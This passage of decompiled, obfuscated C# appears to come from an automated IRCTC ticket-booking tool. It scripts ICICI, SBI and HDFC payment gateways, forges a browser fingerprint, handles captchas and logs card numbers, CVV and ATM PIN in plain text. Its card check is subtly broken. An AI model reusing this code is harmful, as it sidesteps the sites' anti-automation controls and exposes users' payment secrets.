                            text7 = "CardTypeSelectBox=" + text12 + "&CardNum1=" + text8 + "&CardNum2=" + text9 + "&CardNum3=" + text10 + "&CardNum4=" + text11 + "&CardNum5=&CardNum=" + text + "&ExpDtMon=" + text3 + "&ExpDtYr=" + text4 + "&CVVNum=" + text6 + "&NameOnCard=" + text2.Replace(' ', '+') + "&ATMPIN=" + HttpUtility.UrlEncode(text5) + "&IsSurchargeZero=yes&CaptchaValue=&numberrow=0%2C1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9&MerchantType=SSL&isPayClicked=disabled&isIDebitFlow=true&CardType=" + text13 + "&MerchantTxnID=" + text14 + "&MerchantID=" + text15 + "&txnId=" + text16 + "&IsMerchantMPI=N&IsMerchantEMI=N&CVV2FieldPresentIndicator=1&isDisplayCaptcha=&Matrix=65215443783219870690%7C59668224750037981143%7C27423468167059850391%7C55107367924938810624%7C&Seed=1337&isIQuickRegRequired=false&custRegNo=null";
                            string_91 = string_92;
                            string_92 = "https://ipay.icicibank.com/mpi/Moto.jsp";
                            clsMain.Lock("Second Hit Inp = " + text7);
                            if (!_Request(string_92, text7, string_91, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_94, ref string_93, ref webException_0))
                            {
                                clsMain.Lock("Second Hit Failed. err = " + string_93);
                                string_90 = "Failed while making Payment.";
                                return false;
                            }
                            clsMain.Lock("Second Hit output = " + string_94);
                            if (string_94.IndexOf("document.forms[0].submit", StringComparison.CurrentCultureIgnoreCase) <= 0)
                            {
                                string_90 = "Failed! Payment may be Done, Ticket Not Booked";
                                clsMain.Lock("Second Hit Failed, Not valid HTML err = " + string_90);
                                return false;
                            }
                            clsMain.Lock("Success ProcessICICIDebit");
                            string_89 = string_94;
                            string_90 = string_92;
                            return true;
                        }
                    }
                    catch (Exception ex)
                    {
                        clsMain.method_74("ProcessICICIDebit", ex.Message);
                        result = false;
                    }
                    return result;
                }
                string_90 = "Invalid Card No.";
                clsMain.Lock("Card No. Validation Failed, returning.");
                result2 = false;
            }
            return result2;
        }

        private string method_14()
        {
            DateTime utcNow = DateTime.UtcNow;
            DateTime dateTime = new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc);
            return ((long)(utcNow - dateTime).TotalMilliseconds).ToString();
        }

        private bool method_107(string string_86, string string_87, string string_88, ref string string_89, ref string string_90, UpdateTStatus updateTStatus_2)
        {
            string_89 = "";
            string_90 = "";
            clsMain.Lock("Enter ProcessICICIDebit.");
            if (!string_86.Contains("icicibank"))
            {
                string_90 = "Some thing went wrong with ICICI Debit Payment";
                clsMain.Lock("Html doesn't contains icicibank, returning.");
                return false;
            }
            string_89 = "";
            string string_91 = "https://www.irctc.co.in/eticketing/jpInput.jsf?cid=1";
            string text = string_87.Split(new string[1] { "||" }, StringSplitOptions.None)[0].Trim();
            string string_92 = "";
            string text2 = "https://ipg.icicibank.com";
            string text3 = class3_0.Method_SerialInp(string_86, ref string_92, false);
            CookieContainer cookieContainer_ = null;
            if (text.Length != 16 && text[0] != '4' && text[0] != '5')
            {
                string_90 = "Invalid Card No.";
                clsMain.Lock("Card No. Validation Failed, returning.");
                return false;
            }
            string string_93 = "";
            string string_94 = "";
            try
            {
                clsMain.Lock("First Hit Inp = " + text3);
                if (!_Request(string_92, text3, string_91, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_94, ref string_93, ref webException_0))
                {
                    clsMain.Lock("First Hit Failed. err = " + string_93);
                    string_90 = "ICICI Debit Not Working - Payment Failed";
                    return false;
                }
                text3 = "";
                string text4 = string_94.Substring(string_94.IndexOf("output_frame\" src") + 19);
                string_92 = text2 + text4.Substring(0, text4.IndexOf("\""));
                clsMain.Lock("Second Hit Inp = " + text3);
                if (!_Request(string_92, text3, string_91, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_94, ref string_93, ref webException_0))
                {
                    clsMain.Lock("Second Hit Failed. err = " + string_93);
                    string_90 = "ICICI Debit Not Working - Payment Failed";
                    return false;
                }
                string text5 = string_92.Substring(string_92.IndexOf("paymentID") + 10);
                text5 = text5.Substring(0, text5.IndexOf("&"));
                string_92 = "https://ipg.icicibank.com/ICICIPG/encryptionServlet?generateKeypair=true&" + method_14();
                _Request(string_92, text3, string_91, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_93, ref string_93, ref webException_0);
                string text6 = string_93.Substring(string_93.IndexOf(",\"n\":") + 6);
                text6 = text6.Substring(0, text6.IndexOf("\""));
                clsMain.Lock("Second Hit Output htm = " + string_94);
                text3 = Class21.smethod_11(string_94, string_87, string_93, text6, "D");
                string_91 = string_92;
                string_92 = text2 + "/ICICIPG/tranPipeHTTP.htm?param=tranHTTPPayPageValidation";
                clsMain.Lock("Second Hit Inp = " + text3);
                if (_Request(string_92, text3, string_91, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_94, ref string_93, ref webException_0))
                {
                    clsMain.Lock("Third Hit output = " + string_94);
                    if (string_94.IndexOf("Please wait your Transaction is getting processed...", StringComparison.CurrentCultureIgnoreCase) > 0)
                    {
                        clsMain.Lock("Success ProcessICICIDebit");
                        string_89 = string_94.Replace("'", "\"");
                        string_90 = string_92;
                        return true;
                    }
                    string_90 = "Failed! Payment may be Done, Ticket Not Booked";
                    clsMain.Lock("Second Hit Failed, Not valid HTML err = " + string_90);
                    return false;
                }
                clsMain.Lock("Third Hit Failed. err = " + string_93);
                string_90 = "Failed while making Payment.";
                return false;
            }
            catch (Exception ex)
            {
                clsMain.method_74("ProcessICICIDebit", ex.Message);
                return false;
            }
        }

        private string method_108(string string_86, string string_87, int int_28)
        {
            string text = "";
            IEnumerable<char> source = string_86.ToCharArray();
            if (func_0 == null)
            {
                func_0 = Class12.smethod_23;
            }
            string[] array = source.Select(func_0).ToArray();
            string[] array2 = string_87.Split(new string[1] { "|" }, StringSplitOptions.None);
            for (int i = 0; i < array.Length; i++)
            {
                int num = array2[i].IndexOf(array[i]);
                if ((num + 1) % 2 == 0)
                {
                    num = array2[i].IndexOf(array[i], num + 1);
                }
                text += array2[i][num + 1];
            }
            text = (10000 - int_28 + int.Parse(text)).ToString();
            return Class12.smethod_22((text.Length <= 4) ? text : text.Substring(1, 4));
        }

        internal bool method_109(string string_86, string string_87, string string_88, ref string string_89, ref string string_90, UpdateTStatus updateTStatus_2)
        {
            int num = 0;
            int num2 = 0;
            bool result = false;
            clsMain.Lock("Enter ProcessSBIDebit.");
            string string_91 = "https://www.irctc.co.in/eticketing/journeySummary.jsf?cid=1";
            do
            {
                try
                {
                    num++;
                    string_89 = "";
                    string_90 = "";
                    string[] array = string_87.Split(new string[1] { "||" }, StringSplitOptions.None);
                    array[0].Trim();
                    string text = array[2];
                    string string_92 = "";
                    string text2 = "https://securepayments.fssnet.co.in/pgwayb";
                    string string_93 = class3_0.Method_SerialInp(string_86, ref string_92, false);
                    CookieContainer cookieContainer_ = new CookieContainer();
                    string string_94 = "";
                    string string_95 = "";
                    if (text.Length == 2 && text[0] == '0')
                    {
                        text = text.Substring(1, 1);
                    }
                    if (updateTStatus_1 != null)
                    {
                        updateTStatus_1.BeginInvoke(1, "Login into SBI_DebitCard.", tCntrlName_, null, null);
                    }
                    if (_Request(string_92, string_93, string_91, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_95, ref string_94, ref webException_0))
                    {
                        while (true)
                        {
                            num2++;
                            string string_96 = "MCK75";
                            if (updateTStatus_1 != null)
                            {
                                updateTStatus_1.BeginInvoke(1, "Payment Process into SBI_DebitCard.", tCntrlName_, null, null);
                            }
                            string_93 = Class21.smethod_5(string_95, string_87, string_96, "pgwayb", "D");
                            string_91 = string_92;
                            string_92 = text2 + "/paymentrouter.htm";
                            clsMain.Lock("First Hit Inp = " + string_93);
                            if (_Request(string_92, string_93, string_91, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_95, ref string_94, ref webException_0))
                            {
                                clsMain.Lock("First Hit output = " + string_95);
                                if (string_95.Contains("Card Holders Name"))
                                {
                                    if (!string_95.Contains("id=\"debitCaptchaMsg"))
                                    {
                                        break;
                                    }
                                    if (!string_95.Contains("Invalid captcha"))
                                    {
                                        if (string_95.Contains("Invalid card number"))
                                        {
                                            string_90 = "Invaild Card's Details";
                                            clsMain.Lock("Second Hit Failed. Check HTML");
                                            Class11.smethod_3(class3_0.BANKSAVEAS, "1");
                                            return false;
                                        }
                                        break;
                                    }
                                    continue;
                                }
                                if (string_95.Contains("result=CAPTURED"))
                                {
                                    string_89 = string_95;
                                    string_90 = string_92;
                                    clsMain.Lock("Success ProcessSBIDebit ");
                                    return true;
                                }
                                if (string_95.Contains("result=NOT+CAPTURED"))
                                {
                                    string_90 = "Payment Not Captured";
                                    clsMain.Lock("Final Hit Payment Failed. err = " + string_94);
                                    return false;
                                }
                                break;
                            }
                            clsMain.Lock("Second Page Details. Check HTML" + string_94);
                            break;
                        }
                    }
                    else
                    {
                        clsMain.Lock("First Hit Failed. Check HTML" + string_94);
                    }
                    if (num >= 2)
                    {
                        clsMain.Lock("First Hit Failed. err = " + string_94);
                        string_90 = "Failed while making Payment.";
                        return false;
                    }
                }
                catch (Exception ex)
                {
                    clsMain.method_74("ProcessSBIDebit", ex.Message);
                    return false;
                }
            }
            while (clsMain.method_79());
            return result;
        }

        private void method_110(object object_18)
        {
            CookieContainer cookieContainer_ = object_18 as CookieContainer;
            string string_ = "";
            bool bool_ = false;
            WebException webException_ = null;
            HttpStatusCode httpStatusCode_ = HttpStatusCode.Accepted;
            method_100("https://merchant.onlinesbi.com/merchant/logout.htm", "https://merchant.onlinesbi.com/merchant/merchantinter.htm", webProxy_3, ref cookieContainer_, true, false, 30000, ref string_, ref bool_, ref webException_, ref httpStatusCode_, ref string_);
        }

        private bool method_113(string string_86, string string_87, string string_88, ref string string_89, ref string string_90, UpdateTStatus updateTStatus_2)
        {
            bool result = false;
            string_89 = "";
            string_90 = "";
            int num = 90000;
            int num2 = 0;
            clsMain.Lock("Enter ProcessHDFCNetBanking.");
            if (string_86.Contains("hdfcbank"))
            {
                string_89 = "";
                string string_91 = "https://www.irctc.co.in/eticketing/jpInput.jsf?cid=1";
                string[] array = string_87.Split(new string[1] { "||" }, StringSplitOptions.None);
                string text = array[0].Trim();
                string text2 = array[1];
                string value = "";
                if (array.Length > 2)
                {
                    value = array[2];
                }
                string string_92 = "";
                string string_93 = "";
                string string_94 = "";
                string text3 = "";
                string text4 = "";
                DateTime now = DateTime.Now;
                bool result2;
                try
                {
                    CookieContainer cookieContainer_;
                    string text5;
                    while (true)
                    {
                        if (!bool_13)
                        {
                            text5 = class3_0.Method_SerialInp(string_86, ref string_92, false);
                        }
                        else
                        {
                            bool_13 = false;
                            string[] array2 = string_86.Split(new string[1] { "|" }, StringSplitOptions.None);
                            text5 = array2[0];
                            string_92 = array2[1];
                        }
                        cookieContainer_ = null;
                        num2++;
                        clsMain.Lock("First Hit : Inp = " + text5);
                        if (updateTStatus_1 != null)
                        {
                            updateTStatus_1.BeginInvoke(1, "Init. HDFC_NB(1/8)", tCntrlName_, null, null);
                        }
                        if (_Request(string_92, text5, string_91, webProxy_3, ref cookieContainer_, false, true, num, num, ref string_94, ref string_93, ref webException_0))
                        {
                            clsMain.Lock("First Output htm = " + string_94);
                            if (!string.IsNullOrEmpty(string_94.Trim()) && string_94.Contains("HDFC Bank Direct Pay"))
                            {
                                int startIndex = string_94.IndexOf("var MerchantCode") + 5;
                                startIndex = string_94.IndexOf("\"", startIndex) + 1;
                                int length = string_94.IndexOf("\"", startIndex) - startIndex;
                                string text6 = string_94.Substring(startIndex, length);
                                startIndex = string_94.IndexOf("var EpiReqId", startIndex) + 5;
                                startIndex = string_94.IndexOf("\"", startIndex) + 1;
                                length = string_94.IndexOf("\"", startIndex) - startIndex;
                                string text7 = string_94.Substring(startIndex, length);
                                startIndex = string_94.IndexOf("var ClientCode", startIndex) + 5;
                                startIndex = string_94.IndexOf("\"", startIndex) + 1;
                                length = string_94.IndexOf("\"", startIndex) - startIndex;
                                string text8 = string_94.Substring(startIndex, length);
                                startIndex = string_94.IndexOf("var MerchantRefNo", startIndex) + 7;
                                startIndex = string_94.IndexOf("\"", startIndex) + 1;
                                length = string_94.IndexOf("\"", startIndex) - startIndex;
                                string text9 = string_94.Substring(startIndex, length);
                                startIndex = string_94.IndexOf("var TxnDateTime", startIndex) + 7;
                                startIndex = string_94.IndexOf("\"", startIndex) + 1;
                                length = string_94.IndexOf("\"", startIndex) - startIndex;
                                string text10 = string_94.Substring(startIndex, length);
                                startIndex = string_94.IndexOf("var OrgReqDate", startIndex) + 7;
                                startIndex = string_94.IndexOf("\"", startIndex) + 1;
                                length = string_94.IndexOf("\"", startIndex) - startIndex;
                                string str = string_94.Substring(startIndex, length);
                                startIndex = string_94.IndexOf("var TxnAmount", startIndex) + 7;
                                startIndex = string_94.IndexOf("\"", startIndex) + 1;
                                length = string_94.IndexOf("\"", startIndex) - startIndex;
                                string text11 = string_94.Substring(startIndex, length);
                                startIndex = string_94.IndexOf("var TxnScAmount", startIndex) + 7;
                                startIndex = string_94.IndexOf("\"", startIndex) + 1;
                                length = string_94.IndexOf("\"", startIndex) - startIndex;
                                string text12 = string_94.Substring(startIndex, length);
                                startIndex = string_94.IndexOf("var DynamicUrl", startIndex) + 7;
                                startIndex = string_94.IndexOf("\"", startIndex) + 1;
                                length = string_94.IndexOf("\"", startIndex) - startIndex;
                                string str2 = string_94.Substring(startIndex, length);
                                startIndex = string_94.IndexOf("var CheckSum", startIndex) + 7;
                                startIndex = string_94.IndexOf("\"", startIndex) + 1;
                                length = string_94.IndexOf("\"", startIndex) - startIndex;
                                string text13 = string_94.Substring(startIndex, length);
                                string str3 = "*" + text7 + "*" + text6 + "*" + text8 + "*" + text9 + "*" + text10 + "******";
                                text5 = "fldAppId=XT&fldTxnId=RGN&fldScrnSeqNbr=01&fldLangId=eng&fldDeviceId=01&fldWebServerId=YG&fldAppServerId=ZZ&fldRandomNumber=&fldRefPage=rsloginhtml&fldRefVal=" + text + "--MERCHANT-Y-&fldRsaAuthReq=Y&fldClientCode=" + text8 + "&fldMerchCode=" + text6 + "&fldClientAccNum=&fldAccReqFlag=N&fldMerchRefNbr=" + text9 + "&fldSucStatFlg=N&fldFailStatFlg=N&fldDatTimeTxn=" + HttpUtility.UrlEncode(text10) + "&fldTxnCurr=INR&fldTxnAmt=" + text11 + "&fldTxnScAmt=" + text12 + "&fldDevicePrint=&fldRef1=&fldRef2=&fldRef3=&fldRef4=&fldRef5=&fldRef6=&fldRef7=&fldRef8=&fldRef9=&fldRef10=&fldRef11=&fldDate1=&fldDate2=&fldCheckSum=&fldDynamicUrl=" + HttpUtility.UrlEncode(str2) + "&fldDisplayDetails=&fldDetails1=&fldDetails2=&fldDetails3=&fldEpiToken=" + HttpUtility.UrlEncode(str3) + "&fldEpiReqId=" + text7 + "&OrgReqDate=" + HttpUtility.UrlEncode(str) + "&fldLoginUserId=" + text;
                                string_91 = "https://netbanking.hdfcbank.com/netbanking/RSLogin.html?v=4";
                                string_92 = "https://netbanking.hdfcbank.com/netbanking/epientry";
                                clsMain.Lock("Second Hit : Inp = " + text5);
                                if (updateTStatus_1 != null)
                                {
                                    updateTStatus_1.BeginInvoke(1, "Init. HDFC_NB(2/8)", tCntrlName_, null, null);
                                }
                                if (_Request(string_92, text5, string_91, webProxy_3, ref cookieContainer_, false, true, num, num, ref string_94, ref string_93, ref webException_0))
                                {
                                    clsMain.Lock("Second Hit Output = " + string_94);
                                    if (!string_94.Contains("fldPassword"))
                                    {
                                        if (string_94.Contains("errormessage='"))
                                        {
                                            startIndex = string_94.IndexOf("errormessage='");
                                            startIndex = string_94.IndexOf("'", startIndex) + 1;
                                            length = string_94.IndexOf("'", startIndex) - startIndex;
                                            string_90 = string_94.Substring(startIndex, length).Trim();
                                            if (string_90.Contains("16001"))
                                            {
                                                string_90 = "You are not registered for NetBanking.";
                                            }
                                            if (string_90.IndexOf("last session was terminated incorrectly", StringComparison.CurrentCultureIgnoreCase) >= 0 && num2 < 7)
                                            {
                                                continue;
                                            }
                                        }
                                        if (string.IsNullOrEmpty(string_90) && string_94.Contains("frmResetPassword"))
                                        {
                                            string_90 = "HDFC: Please Reset your Login Password";
                                        }
                                        if (string.IsNullOrEmpty(string_90))
                                        {
                                            string_90 = "Failed while Login into HDFC";
                                        }
                                        clsMain.Lock("Second Hit, Not valid HTML err = " + string_90);
                                        return false;
                                    }
                                    string str4 = "version=2&pm_fpua=Godzila/5.0 (windows nt 6.1) applewebkit/537.36 (khtml, like gecko) chrome/44.0.2403.157 safari/537.36|5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36|Win32&pm_fpsc=24|1600|900|856&pm_fpsw=&pm_fptz=5.5&pm_fpln=lang=en-US|syslang=|userlang=&pm_fpjv=1&pm_fpco=1&pm_fpasw=widevinecdmadapter|mhjfbmdgcfjbbpaeojofohoefgiehjai|pepflashplayer|internal-remoting-viewer|internal-nacl-plugin|internal-pdf-viewer&pm_fpan=Netscape&pm_fpacn=Mozilla&pm_fpol=true&pm_fposp=&pm_fpup=&pm_fpsaw=1600&pm_fpspd=24&pm_fpsbd=&pm_fpsdx=&pm_fpsdy=&pm_fpslx=&pm_fpsly=&pm_fpsfse=&pm_fpsui=";
                                    string string_95 = Math.Ceiling(10000000.0 + (double)new Random().Next(90000001)).ToString();
                                    string text14 = text2.ToUpper().Substring(2, text2.Length - 2);
                                    while (text14.Length < 32)
                                    {
                                        text14 += "0";
                                    }
                                    string text15 = method_5(text14, ref string_95);
                                    string text16 = "<html>\n<head>\n<script type=\"text/javascript\">\n\t/*-----------------------------------------------------------------------------\n\tThis source is part of the FLEXCUBE@ Java App Server Software System and is\n\tcopyrighted by i-flex Solutions Limited.\n\tAll rights reserved. No part of this work may be reproduced, stored in a\n\tretrieval system, adopted or transmitted in any form or by any means,\n\telectronic, mechanical, photographic, graphic, optic recording or otherwise,\n\ttranslated in any language or computer language, without the prior written\n\tpermission of i-flex Solutions Limited.\n\ti-flex Solutions Limited.\n\t10-11, SDF I, SEEPZ, Andheri (East),\n\tMumbai - 400 096.\n\tIndia\n\tCopyright 2004 i-flex Solutions Limited.\n\tModification History\n\tDate Version Author Description\n\t__________ ___________ _______________ ________________________________________\n\t22/11/2012 1.0 Sandeep Saxena Des algo\n\t------------------------------------------------------------------------------*/\n\t//des\n\t//this takes the key, the message, and whether to encrypt or decrypt\n\tfunction des (key, message, encrypt, mode, iv, padding) {\n\t//declaring this locally speeds things up a bit\n\tvar spfunction1 = new Array (0x1010400,0,0x10000,0x1010404,0x1010004,0x10404,0x4,0x10000,0x400,0x1010400,0x1010404,0x400,0x1000404,0x1010004,0x1000000,0x4,0x404,0x1000400,0x1000400,0x10400,0x10400,0x1010000,0x1010000,0x1000404,0x10004,0x1000004,0x1000004,0x10004,0,0x404,0x10404,0x1000000,0x10000,0x1010404,0x4,0x1010000,0x1010400,0x1000000,0x1000000,0x400,0x1010004,0x10000,0x10400,0x1000004,0x400,0x4,0x1000404,0x10404,0x1010404,0x10004,0x1010000,0x1000404,0x1000004,0x404,0x10404,0x1010400,0x404,0x1000400,0x1000400,0,0x10004,0x10400,0,0x1010004);\n\tvar spfunction2 = new Array (-0x7fef7fe0,-0x7fff8000,0x8000,0x108020,0x100000,0x20,-0x7fefffe0,-0x7fff7fe0,-0x7fffffe0,-0x7fef7fe0,-0x7fef8000,-0x80000000,-0x7fff8000,0x100000,0x20,-0x7fefffe0,0x108000,0x100020,-0x7fff7fe0,0,-0x80000000,0x8000,0x108020,-0x7ff00000,0x100020,-0x7fffffe0,0,0x108000,0x8020,-0x7fef8000,-0x7ff00000,0x8020,0,0x108020,-0x7fefffe0,0x100000,-0x7fff7fe0,-0x7ff00000,-0x7fef8000,0x8000,-0x7ff00000,-0x7fff8000,0x20,-0x7fef7fe0,0x108020,0x20,0x8000,-0x80000000,0x8020,-0x7fef8000,0x100000,-0x7fffffe0,0x100020,-0x7fff7fe0,-0x7fffffe0,0x100020,0x108000,0,-0x7fff8000,0x8020,-0x80000000,-0x7fefffe0,-0x7fef7fe0,0x108000);\n\tvar spfunction3 = new Array (0x208,0x8020200,0,0x8020008,0x8000200,0,0x20208,0x8000200,0x20008,0x8000008,0x8000008,0x20000,0x8020208,0x20008,0x8020000,0x208,0x8000000,0x8,0x8020200,0x200,0x20200,0x8020000,0x8020008,0x20208,0x8000208,0x20200,0x20000,0x8000208,0x8,0x8020208,0x200,0x8000000,0x8020200,0x8000000,0x20008,0x208,0x20000,0x8020200,0x8000200,0,0x200,0x20008,0x8020208,0x8000200,0x8000008,0x200,0,0x8020008,0x8000208,0x20000,0x8000000,0x8020208,0x8,0x20208,0x20200,0x8000008,0x8020000,0x8000208,0x208,0x8020000,0x20208,0x8,0x8020008,0x20200);\n\tvar spfunction4 = new Array (0x802001,0x2081,0x2081,0x80,0x802080,0x800081,0x800001,0x2001,0,0x802000,0x802000,0x802081,0x81,0,0x800080,0x800001,0x1,0x2000,0x800000,0x802001,0x80,0x800000,0x2001,0x2080,0x800081,0x1,0x2080,0x800080,0x2000,0x802080,0x802081,0x81,0x800080,0x800001,0x802000,0x802081,0x81,0,0,0x802000,0x2080,0x800080,0x800081,0x1,0x802001,0x2081,0x2081,0x80,0x802081,0x81,0x1,0x2000,0x800001,0x2001,0x802080,0x800081,0x2001,0x2080,0x800000,0x802001,0x80,0x800000,0x2000,0x802080);\n\tvar spfunction5 = new Array (0x100,0x2080100,0x2080000,0x42000100,0x80000,0x100,0x40000000,0x2080000,0x40080100,0x80000,0x2000100,0x40080100,0x42000100,0x42080000,0x80100,0x40000000,0x2000000,0x40080000,0x40080000,0,0x40000100,0x42080100,0x42080100,0x2000100,0x42080000,0x40000100,0,0x42000000,0x2080100,0x2000000,0x42000000,0x80100,0x80000,0x42000100,0x100,0x2000000,0x40000000,0x2080000,0x42000100,0x40080100,0x2000100,0x40000000,0x42080000,0x2080100,0x40080100,0x100,0x2000000,0x42080000,0x42080100,0x80100,0x42000000,0x42080100,0x2080000,0,0x40080000,0x42000000,0x80100,0x2000100,0x40000100,0x80000,0,0x40080000,0x2080100,0x40000100);\n\tvar spfunction6 = new Array (0x20000010,0x20400000,0x4000,0x20404010,0x20400000,0x10,0x20404010,0x400000,0x20004000,0x404010,0x400000,0x20000010,0x400010,0x20004000,0x20000000,0x4010,0,0x400010,0x20004010,0x4000,0x404000,0x20004010,0x10,0x20400010,0x20400010,0,0x404010,0x20404000,0x4010,0x404000,0x20404000,0x20000000,0x20004000,0x10,0x20400010,0x404000,0x20404010,0x400000,0x4010,0x20000010,0x400000,0x20004000,0x20000000,0x4010,0x20000010,0x20404010,0x404000,0x20400000,0x404010,0x20404000,0,0x20400010,0x10,0x4000,0x20400000,0x404010,0x4000,0x400010,0x20004010,0,0x20404000,0x20000000,0x400010,0x20004010);\n\tvar spfunction7 = new Array (0x200000,0x4200002,0x4000802,0,0x800,0x4000802,0x200802,0x4200800,0x4200802,0x200000,0,0x4000002,0x2,0x4000000,0x4200002,0x802,0x4000800,0x200802,0x200002,0x4000800,0x4000002,0x4200000,0x4200800,0x200002,0x4200000,0x800,0x802,0x4200802,0x200800,0x2,0x4000000,0x200800,0x4000000,0x200800,0x200000,0x4000802,0x4000802,0x4200002,0x4200002,0x2,0x200002,0x4000000,0x4000800,0x200000,0x4200800,0x802,0x200802,0x4200800,0x802,0x4000002,0x4200802,0x4200000,0x200800,0,0x2,0x4200802,0,0x200802,0x4200000,0x800,0x4000002,0x4000800,0x800,0x200002);\n\tvar spfunction8 = new Array (0x10001040,0x1000,0x40000,0x10041040,0x10000000,0x10001040,0x40,0x10000000,0x40040,0x10040000,0x10041040,0x41000,0x10041000,0x41040,0x1000,0x40,0x10040000,0x10000040,0x10001000,0x1040,0x41000,0x40040,0x10040040,0x10041000,0x1040,0,0,0x10040040,0x10000040,0x10001000,0x41040,0x40000,0x41040,0x40000,0x10041000,0x1000,0x40,0x10040040,0x1000,0x41040,0x10001000,0x40,0x10000040,0x10040000,0x10040040,0x10000000,0x40000,0x10001040,0,0x10041040,0x40040,0x10000040,0x10040000,0x10001000,0x10001040,0,0x10041040,0x41000,0x41000,0x1040,0x1040,0x40040,0x10000000,0x10041000);\n\t//create the 16 or 48 subkeys we will need\n\tvar keys = des_createKeys (key);\n\tvar m=0, i, j, temp, temp2, right1, right2, left, right, looping;\n\tvar cbcleft, cbcleft2, cbcright, cbcright2\n\tvar endloop, loopinc;\n\tvar len = message.length;\n\tvar chunk = 0;\n\t//set up the loops for single and triple des\n\tvar iterations = keys.length == 32 ? 3 : 9; //single or triple des\n\tif (iterations == 3) {looping = encrypt ? new Array (0, 32, 2) : new Array (30, -2, -2);}\n\telse {looping = encrypt ? new Array (0, 32, 2, 62, 30, -2, 64, 96, 2) : new Array (94, 62, -2, 32, 64, 2, 30, -2, -2);}\n\t//pad the message depending on the padding parameter\n\tif (padding == 2) message += \" \"; //pad the message with spaces\n\telse if (padding == 1) {temp = 8-(len%8); message += String.fromCharCode (temp,temp,temp,temp,temp,temp,temp,temp); if (temp==8) len+=8;} //PKCS7 padding\n\telse if (!padding) message += \"\\0\\0\\0\\0\\0\\0\\0\\0\"; //pad the message out with null bytes\n\t//store the result here\n\tresult = \"\";\n\ttempresult = \"\";\n\tif (mode == 1) { //CBC mode\n\tcbcleft = (iv.charCodeAt(m++) << 24) | (iv.charCodeAt(m++) << 16) | (iv.charCodeAt(m++) << 8) | iv.charCodeAt(m++);\n\tcbcright = (iv.charCodeAt(m++) << 24) | (iv.charCodeAt(m++) << 16) | (iv.charCodeAt(m++) << 8) | iv.charCodeAt(m++);\n\tm=0;\n\t}\n\t//loop through each 64 bit chunk of the message\n\twhile (m < len) {\n\tleft = (message.charCodeAt(m++) << 24) | (message.charCodeAt(m++) << 16) | (message.charCodeAt(m++) << 8) | message.charCodeAt(m++);\n\tright = (message.charCodeAt(m++) << 24) | (message.charCodeAt(m++) << 16) | (message.charCodeAt(m++) << 8) | message.charCodeAt(m++);\n\t//for Cipher Block Chaining mode, xor the message with the previous result\n\tif (mode == 1) {if (encrypt) {left ^= cbcleft; right ^= cbcright;} else {cbcleft2 = cbcleft; cbcright2 = cbcright; cbcleft = left; cbcright = right;}}\n\t//first each 64 but chunk of the message must be permuted according to IP\n\ttemp = ((left >>> 4) ^ right) & 0x0f0f0f0f; right ^= temp; left ^= (temp << 4);\n\ttemp = ((left >>> 16) ^ right) & 0x0000ffff; right ^= temp; left ^= (temp << 16);\n\ttemp = ((right >>> 2) ^ left) & 0x33333333; left ^= temp; right ^= (temp << 2);\n\ttemp = ((right >>> 8) ^ left) & 0x00ff00ff; left ^= temp; right ^= (temp << 8);\n\ttemp = ((left >>> 1) ^ right) & 0x55555555; right ^= temp; left ^= (temp << 1);\n\tleft = ((left << 1) | (left >>> 31));\n\tright = ((right << 1) | (right >>> 31));\n\t//do this either 1 or 3 times for each chunk of the message\n\tfor (j=0; j<iterations; j+=3) {\n\tendloop = looping[j+1];\n\tloopinc = looping[j+2];\n\t//now go through and perform the encryption or decryption\n\tfor (i=looping[j]; i!=endloop; i+=loopinc) { //for efficiency\n\tright1 = right ^ keys[i];\n\tright2 = ((right >>> 4) | (right << 28)) ^ keys[i+1];\n\t//the result is attained by passing these bytes through the S selection functions\n\ttemp = left;\n\tleft = right;\n\tright = temp ^ (spfunction2[(right1 >>> 24) & 0x3f] | spfunction4[(right1 >>> 16) & 0x3f]\n\t| spfunction6[(right1 >>> 8) & 0x3f] | spfunction8[right1 & 0x3f]\n\t| spfunction1[(right2 >>> 24) & 0x3f] | spfunction3[(right2 >>> 16) & 0x3f]\n\t| spfunction5[(right2 >>> 8) & 0x3f] | spfunction7[right2 & 0x3f]);\n\t}\n\ttemp = left; left = right; right = temp; //unreverse left and right\n\t} //for either 1 or 3 iterations\n\t//move then each one bit to the right\n\tleft = ((left >>> 1) | (left << 31));\n\tright = ((right >>> 1) | (right << 31));\n\t//now perform IP-1, which is IP in the opposite direction\n\ttemp = ((left >>> 1) ^ right) & 0x55555555; right ^= temp; left ^= (temp << 1);\n\ttemp = ((right >>> 8) ^ left) & 0x00ff00ff; left ^= temp; right ^= (temp << 8);\n\ttemp = ((right >>> 2) ^ left) & 0x33333333; left ^= temp; right ^= (temp << 2);\n\ttemp = ((left >>> 16) ^ right) & 0x0000ffff; right ^= temp; left ^= (temp << 16);\n\ttemp = ((left >>> 4) ^ right) & 0x0f0f0f0f; right ^= temp; left ^= (temp << 4);\n\t//for Cipher Block Chaining mode, xor the message with the previous result\n\tif (mode == 1) {if (encrypt) {cbcleft = left; cbcright = right;} else {left ^= cbcleft2; right ^= cbcright2;}}\n\ttempresult += String.fromCharCode ((left>>>24), ((left>>>16) & 0xff), ((left>>>8) & 0xff), (left & 0xff), (right>>>24), ((right>>>16) & 0xff), ((right>>>8) & 0xff), (right & 0xff));\n\tchunk += 8;\n\tif (chunk == 512) {result += tempresult; tempresult = \"\"; chunk = 0;}\n\t} //for every 8 characters, or 64 bits in the message\n\t//return the result as an array\n\treturn result + tempresult;\n\t} //end of des\n\t//des_createKeys\n\t//this takes as input a 64 bit key (even though only 56 bits are used)\n\t//as an array of 2 integers, and returns 16 48 bit keys\n\tfunction des_createKeys (key) {\n\t//declaring this locally speeds things up a bit\n\tpc2bytes0 = new Array (0,0x4,0x20000000,0x20000004,0x10000,0x10004,0x20010000,0x20010004,0x200,0x204,0x20000200,0x20000204,0x10200,0x10204,0x20010200,0x20010204);\n\tpc2bytes1 = new Array 